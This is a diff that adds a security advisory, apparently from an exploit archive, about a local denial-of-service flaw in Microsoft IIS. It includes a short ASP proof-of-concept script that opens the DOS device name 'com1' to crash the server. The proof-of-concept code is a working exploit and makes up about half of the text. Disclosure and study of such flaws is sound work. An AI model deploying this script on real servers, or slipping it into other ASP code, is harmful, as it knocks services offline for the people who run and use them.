@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/2973/info
+
+Microsoft IIS is prone to denial of service attacks by local users. This issue is exploitable if the local attacker can create an .asp file which makes calls to various devices names. The local attacker must of course possess the privileges required to create such files.
+
+The end result of exploiting this vulnerability is that the server will crash and a denial of services will occur. The affected services must be restarted to regain normal functionality. 
+
+<%
+  Dim strFileName, objFSO, objFile
+
+  Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
+
+  strFileName = "com1"
+
+  Set objFile = objFSO.OpenTextFile(strFileName)
+
+  Response.Write objFile.ReadAll
+
+  objFile.Close
+
+%>
